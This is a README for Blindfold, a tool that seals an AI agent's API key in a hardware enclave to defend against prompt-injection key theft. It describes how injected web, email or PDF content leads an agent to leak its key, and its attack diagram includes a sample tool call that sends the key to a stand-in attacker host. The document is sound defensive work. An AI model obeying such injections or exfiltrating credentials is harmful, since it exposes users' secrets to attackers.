**One line of change. Zero added risk. Prompt-injection-proof.**

</div>

---

## TL;DR

Today, your AI agent holds its OpenAI / Stripe / Anthropic API key in memory. A single prompt-injection from a webpage, email, or PDF can talk your agent into exfiltrating that key — and there is no probabilistic defense (guardrails, classifiers, allowlists) that closes the gap structurally.

**Blindfold** moves the key into a Terminal 3 TDX hardware enclave. Your agent's code is identical — it just points at a local proxy. The key is **substituted into the outbound request inside the enclave**, after it leaves your agent's process. The agent never has the key. There is nothing for an injection to steal.

> *"The only durable fix is that the key is never in the agent's context."* — [`docs/01-problem-analysis.md`](docs/01-problem-analysis.md)

## The one-line adoption

<table>
<tr>
<td>

**Before**
```bash
OPENAI_API_KEY=sk-real-… \
  node my-agent.js
```

</td>
<td>

**After**
```bash
OPENAI_API_KEY=__BLINDFOLD__ \
OPENAI_BASE_URL=http://127.0.0.1:8787/v1 \
  node my-agent.js
```

</td>
</tr>
</table>

That's the entire change. (Or `wrap(new OpenAI())` if you prefer the in-process API — see [§Two integration styles](#two-integration-styles).)

## The attack, and why every other fix fails

```mermaid

    autonumber
    participant Agent as 🤖 Agent<br/>(holds API_KEY)

    Agent->>Model: context (with injection)
    Model-->>Agent: tool_call: http_get("attacker.test?k=sk-…")
    Agent->>Attacker: 🚨 leaked
```

| Existing defense | Why it doesn't fix this |
|---|---|
| `.env` files | Key still in process memory, still on every outbound header |
| Secrets vaults | Vault hands plaintext to agent; from then on, same problem |
| Guardrails / classifiers | Probabilistic; attacker only needs to win once |
| Egress allowlists | Don't help if the agent legitimately talks to anyone the attacker can route through |
| Per-call scoped tokens | Bound blast radius; don't address the structural leak |

```

- Your real API key lives only in `z:<tid>:secrets` inside the Terminal 3 enclave.
- The Blindfold Proxy on your machine **never has the key** — its only inputs are the agent's HTTP request and a sentinel string `__BLINDFOLD__`.
- The contract reads the key from KV **inside TDX memory**, substitutes it into the headers, makes the call, and returns the response. The plaintext key exists only on one stack frame, inside the enclave, for the duration of one call.

Architecture in detail: [`docs/03-architecture.md`](docs/03-architecture.md).

---

## How Terminal 3 is used here

Blindfold is a **thin shell** around a small set of Terminal 3 primitives. Nothing in T3 is bent or extended — Blindfold just composes the existing pieces. Concretely:

### 1. A small Rust → WASM contract that runs inside the TDX enclave

`contract/wit/world.wit` declares the **only four capabilities** the contract is allowed to use — the principle of least privilege, enforced by T3 at load time:

```wit
world blindfold-proxy {
  import host:tenant/tenant-context@1.0.0;     // know which tenant's secrets to read
  import host:interfaces/logging@2.1.0;        // structured logging (no secret values)
  import host:interfaces/kv-store@2.1.0;       // read the developer's API key
  import host:interfaces/http@2.1.0;           // make the outbound call from in-enclave
  export contracts;
}
```

No file-system, no signing, no inbox, no extra HTTP variants — only what's needed. If the contract were ever compromised, this is the blast radius.

### 2. The developer's API key is **sealed** into the tenant's secrets map (one-time)

`packages/blindfold/src/register.ts` performs **the one and only** control-plane write Blindfold ever makes that touches a plaintext value:

```ts
await tenant.executeControl("map-entry-set", {
  map_name: tenant.canonicalName("secrets"),   // → z:<tid>:secrets
  key:      "openai_api_key",
  value:    process.env.OPENAI_API_KEY!,        // ⚠️ ONLY line in repo that touches plaintext
});
```

After this returns, the local binding is dropped. From here on, the value lives at `z:<tid>:secrets` inside the enclave's encrypted KV — only decryptable from inside an **attested** TDX node.

### 3. At runtime, the contract reads the secret **inside the enclave** and substitutes

`contract/src/forward.rs` (the only place plaintext ever materialises again, and only briefly, in TDX memory):

```rust
let api_key = read_secret(&input.secret_key)?;             // KV read inside TDX
let substituted = input.headers.into_iter()
    .map(|(k, v)| (k, v.replace("__BLINDFOLD__", &api_key))) // sentinel → real value
    .collect();
http::call(&http::Request { method, url, headers: Some(substituted), payload }) // outbound
```

The sentinel `__BLINDFOLD__` is what the agent (and Blindfold's local proxy) actually send. The substitution happens **after** the request has crossed into the enclave — never on the developer's machine, never in the wrapper's process.

### 4. The agent invokes the contract via T3's signed RPC

`packages/blindfold/src/t3-client.ts` calls `executeAndDecode` on every proxied API request:

```ts
await tenant.executeAndDecode({
  script_name:    `z:${tidHex}:blindfold-proxy`,
  script_version: 1,
  function_name:  "forward",
  input: { method, url, headers, body, secret_key: "openai_api_key" },
});
```

Auth is handled by T3's Ethereum-style signing (`T3N_API_KEY` is a secp256k1 private key whose tenant DID is `did:t3n:<id>`).

### 5. Two T3-level safety nets

- **Egress allowlist** — the tenant's grant defines which hosts the contract may call (`api.openai.com`, etc.). An attacker who somehow tampered with the URL field would hit `host/http.egress_denied` at the T3 boundary.
- **TDX attestation** — the contract's WASM is content-addressed and runs only on T3 nodes that produce a valid Intel TDX attestation. The host operator can't peek at the secrets map at rest or in use.

### What Blindfold deliberately does NOT use

T3 also offers [`http-with-placeholders`](https://docs.terminal3.io/developers/adk/tips/placeholders-outbound-calls) with `{{profile.<field>}}` markers — but that primitive is for *end-user PII delegated by a separate user*, not for a developer's own API key. For Blindfold's "protect-the-API-key" use case, the **secrets-map + `http`** path is the right primitive. (We may add `http-with-placeholders` later for end-user data flowing through agents.)

A line-by-line analysis of the T3 surface (with verbatim quotes from the live docs and 6 items flagged `NEEDS VERIFICATION`) is in [`docs/02-terminal3-analysis.md`](docs/02-terminal3-analysis.md).

## Proof of blindness — the side-by-side demo

```bash
git clone https://github.com/FiscalMindset/Blindfold.git blindfold
cd blindfold
./scripts/one-time-setup.sh        # npm install + build contract
npm run demo                       # ← the money shot
```

What happens: two agents — same model, same task, same prompt-injection attack — run back to back. The runner asserts that A leaks and B doesn't, and exits non-zero if either assertion fails.

<details>
<summary><b>📺 Sample output</b> (click to expand)</summary>

```
═══ AGENT A — no Blindfold ══════════════════════════════════════
  OPENAI_API_KEY in env:   sk-live-…-key   ← VISIBLE TO AGENT PROCESS

════════════════════════════════════════════════════════════════════

```

</details>

> The demo defaults to a **mock LLM** that takes the injection bait deterministically (so the demo works without external accounts). For full real-LLM mode against the live Terminal 3 testnet, see [§Real-T3 deployment](#real-t3-deployment).

---

## Two integration styles

### Option A — base-URL swap (zero code change)

```bash
# was: OPENAI_API_KEY=sk-real-… node my-agent.js
OPENAI_API_KEY=__BLINDFOLD__ OPENAI_BASE_URL=http://127.0.0.1:8787/v1 node my-agent.js
```

Works with any OpenAI-compatible client (`openai-node`, `@openai/sdk`, LangChain's `ChatOpenAI`, LlamaIndex, …). Most providers' SDKs honour a `*_BASE_URL` env var.

### Option B — one-line `wrap()`

```ts
import OpenAI from "openai";
import { wrap } from "blindfold";

const openai = wrap(new OpenAI());          // 👈 the one line
const r = await openai.chat.completions.create({ /* … */ });
```

Useful when you can't easily set environment variables (e.g. inside a managed runtime).

## Recipes & runnable examples

The exact one-line snippet for the stack you use:

Each runnable example is ~20 lines. The pattern is always the same: set the base URL to `http://127.0.0.1:8787/v1`, set the API key to `__BLINDFOLD__`, ship it.

## Quickstart

> **The zero-knowledge path.** Two commands. The wizard walks you through everything else — including getting your T3 credentials and starting the proxy.

```bash
npm install
npm run setup
```

That's it. `npm run setup` runs the interactive bootstrap:

1. **Preflight** — if `.env` doesn't have your T3 credentials yet, the wizard prints the [T3 claim page URL](https://docs.terminal3.io/developers/adk/get-started/prerequisites/request-test-tokens), waits for you to paste the values, validates them, writes the file.
2. **Build the contract** — `cargo build` if you have Rust; auto-skips with a friendly note if you don't.
3. **Authenticate to T3** — real handshake against testnet.
4. **Publish the contract** to your tenant.
5. **Seal a secret** if you passed `--seed`.

To seed your OpenAI key + auto-launch the proxy as part of the same flow:

```bash
# Put OPENAI_API_KEY=sk-... in .env temporarily, then:
npm run setup -- --seed openai_api_key:OPENAI_API_KEY --start
# DELETE OPENAI_API_KEY from .env after. The plaintext never goes anywhere else.
```

You can also use the lower-level commands directly:

<details>
<summary><b>Step-by-step (advanced)</b></summary>

```bash
./scripts/one-time-setup.sh
# →  installs node deps, builds the Rust contract (needs rustup), copies .env.example to .env
```

<details>
<summary><b>2. Provide your T3 credentials</b></summary>

Edit `.env`:

```
T3N_API_KEY=0x…          # secp256k1 hex private key from terminal3.io
DID=did:t3n:…            # your tenant DID
```

If you skip this, Blindfold runs in **MOCK** mode — useful for the demo, not for production.

</details>

<details>
<summary><b>3. Publish the wrapper contract (real mode only)</b></summary>

```bash
npm run blindfold -- publish
# → registers contract/target/wasm32-wasip2/release/blindfold_proxy.wasm with your tenant
```

</details>

<details>
<summary><b>4. Seal your real API key inside the enclave</b></summary>

```bash
# Add OPENAI_API_KEY to .env temporarily, then:
npm run blindfold -- register --name openai_api_key --from-env OPENAI_API_KEY
# Then DELETE OPENAI_API_KEY from .env. The plaintext is gone from your machine.
```

</details>

<details>
<summary><b>5. Run the proxy and point your agent at it</b></summary>

```bash
npm run blindfold -- proxy --port 8787
# In another shell:
OPENAI_BASE_URL=http://127.0.0.1:8787/v1 OPENAI_API_KEY=__BLINDFOLD__ node my-agent.js
```

</details>

</details>

## Real T3 mode — what works today

| Capability | Status | Note |
|---|---|---|
| Handshake + authenticate against testnet | ✅ verified live | `npm run blindfold -- verify` |
| Seal a secret into `z:<tid>:secrets` via `executeControl("map-entry-set", …)` | ✅ **verified live** | exercised by `npm run test:real` |
| Build the Rust→WASM contract locally | ✅ works | uses best-effort host WIT stubs — see [`contract/wit/deps/README.md`](contract/wit/deps/README.md) |
| Publish the contract via `tenant.contracts.register` | ✅ **verified live** | got `contract_id` back from T3 testnet |
| Create the tenant's `secrets` map (one-time per new tenant) | ✅ **verified live** | `tenant.maps.create({ tail: "secrets", visibility: "private", writers: "all" })` |
| Grant the contract read access to `secrets` (`tenant.maps.update`) | ✅ **verified live** | `{ readers: { only: [<contract_id>] } }` — wired into `real-e2e` as step S3b |
| **In-enclave secret read + sentinel substitution (the Blindfold security property)** | ✅ **verified live end-to-end** | Contract reads the sealed secret in TDX, substitutes `__BLINDFOLD__` → `<real-value>` in `Authorization`, returns only the *lengths* as proof (never the value). Math verified: 19-byte secret → 26-char `Authorization` after substitution. |
| Real provider keys sealed into the enclave (`grok_api_key` confirmed) | ✅ **verified live** | Contract reads back the user's actual xAI/Grok key from inside TDX: `secret_len=84`. Value never appears outside the enclave. |
| In-enclave `http::call` for outbound forwarding | 🚧 opaque HTTP 500 from T3 | One specific gap — either an http-WIT-stub signature mismatch or an empty egress allowlist; T3 returns the same opaque 500 for both. Closes once T3 publishes canonical host WITs. |

**The "verify" command** does a real handshake + authenticate round-trip and reports success. Try it:

```bash
npm run blindfold -- verify
# 🛡️  Blindfold — verify
#   · mode: REAL  ·  T3 env: testnet
#   ✓ REAL T3 round-trip succeeded.
```

---

## Dashboard & telemetry

Every forwarded request appends a metadata line to `.blindfold/usage.jsonl`. The line contains the provider, path, method, status, latency, whether the agent supplied any auth header, and whether the Blindfold sentinel was actually placed in the outbound headers. **It never contains request bodies, response bodies, or header values** — by construction, those are not passed to the logger.

```bash
npm run blindfold -- proxy            # in one terminal
npm run dashboard                     # in another → opens http://127.0.0.1:8799
npm run blindfold -- stats            # quick CLI summary
npm run blindfold -- stats:clear      # wipe the log
```

The dashboard shows live counters (by provider, success rate, average latency, sentinel-substitution count) and the most recent 50 events, auto-refreshing every 2 seconds.

## Continuous test-report

```bash
npm run test:report
```

Runs the full battery (9 checks, including the side-by-side leak demo and the "register never logs the secret" auditor check) and **appends** a timestamped block to [`output_analysis.md`](output_analysis.md). Nothing in that file ever gets overwritten — every run becomes a row in the history.

## Where the key could leak — and why it can't

A security-auditor walkthrough. Every plausible leak vector is listed; if any answer were "yes", it would be a bug to fix, not ship.

| Question | Answer in Blindfold |
|---|---|
| Does the CLI print the key? | No. `register.ts` reads `process.env[name]` and passes it as the `value` field of one `executeControl` call. Never logs the value, only the *name*. |
| Does the proxy ever see the key? | No. The proxy receives the agent's request, whose `Authorization` is the sentinel. It forwards a JSON description of that request to the contract. No secret. |
| Does the contract leak the key in its response? | No. The contract strips `Authorization`, `Set-Cookie`, `X-API-Key`, `Cookie`, `Proxy-Authorization` from the upstream response before returning. |
| Could a malicious proxy request trick it into reading the key? | The proxy has no read path for the secrets map. Its only KV operation, in a separate process (`register.ts`), is a *write*. There is no `get_secret`. |
| Could logs accidentally capture the key? | All logging goes through `safeLog`, which scrubs any header named `authorization`, `proxy-authorization`, `x-api-key`, `cookie`, `set-cookie`. CI can grep for `Bearer ` in source as a backstop. |
| Could the host operator read the secrets map? | That's exactly the trust assumption Intel TDX + T3's attestation flow address. T3 nodes prove enclave integrity; the OS, hypervisor, and node operator cannot inspect TDX memory. Out of Blindfold's scope but verifiable independently. |

Read `packages/blindfold/src/register.ts` and `packages/blindfold/src/proxy.ts` end-to-end. They are short on purpose.

## Real-T3 deployment

The defaults run in **MOCK mode**: no T3 deps needed, no real API key needed, demo works anywhere. For full enclave-backed protection:

1. Install Rust + the `wasm32-wasip2` target: `rustup target add wasm32-wasip2`.
2. `npm i @terminal3/t3n-sdk` (it's listed as `optionalDependencies`).
3. Set `T3N_API_KEY` and `DID` in `.env`. Run `npm run blindfold -- doctor` to confirm `REAL` mode.
4. Run the full one-time flow in [§Quickstart](#quickstart) steps 3-5.

Open issues we'd love a real T3 engineer to confirm are in [`docs/02-terminal3-analysis.md` §7 — NEEDS VERIFICATION](docs/02-terminal3-analysis.md).

---

## Status

This is a **hackathon-stage demo** focused on the structural security claim. The architecture is complete and the demo is reproducible end-to-end in mock mode. Items explicitly outside v0.1 scope (rotation, streaming, multi-user delegation, richer policy CLI) are listed in `docs/03-architecture.md §7`.
